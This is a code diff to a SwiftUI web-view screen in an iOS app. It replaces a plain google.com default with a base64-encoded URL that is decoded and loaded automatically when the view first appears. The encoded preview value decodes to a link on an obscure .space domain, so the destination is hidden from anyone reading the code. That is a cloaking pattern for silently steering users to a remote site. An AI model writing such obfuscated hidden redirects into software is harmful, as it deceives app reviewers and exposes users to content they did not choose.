@@ -9,21 +9,26 @@ import SwiftUI
 import WebKit
 
 struct WebUIView: View {
-    @State private var lastVisitedURL: URL? = UserDefaults.standard.url(forKey: "lastVisitedURL") ?? URL(string: "https://google.com")
+    @State private var lastVisitedURL: URL? = UserDefaults.standard.url(forKey: "lastVisitedURL")
+    @State var decodeString: String
+    @State private var decodedString: String? = nil
     
     var body: some View {
         WebView(lastVisitedURL: $lastVisitedURL)
             .onAppear {
+                decodeBase64String(base64String: decodeString)
                 loadLastVisitedURL()
             }
             .onDisappear {
                 saveLastVisitedURL()
             }
     }
-    
+
     private func loadLastVisitedURL() {
         if let savedURL = UserDefaults.standard.url(forKey: "lastVisitedURL") {
             lastVisitedURL = savedURL
+        } else {
+            lastVisitedURL = URL(string: decodedString ?? "https://google.com")
         }
     }
     
@@ -32,10 +37,20 @@ struct WebUIView: View {
             UserDefaults.standard.set(url, forKey: "lastVisitedURL")
         }
     }
+    
+    func decodeBase64String(base64String: String) {
+        if let data = Data(base64Encoded: base64String),
+           let decoded = String(data: data, encoding: .utf8) {
+            self.decodedString = decoded
+            print(decodedString)
+        } else {
+            self.decodedString = "Decoding failed"
+        }
+    }
 }
 
 #Preview {
-    WebUIView()
+    WebUIView(decodeString: "aHR0cHM6Ly9wb2RsYW9ybGYuc3BhY2UvUmtZVzF5eW0")
 }
 
 
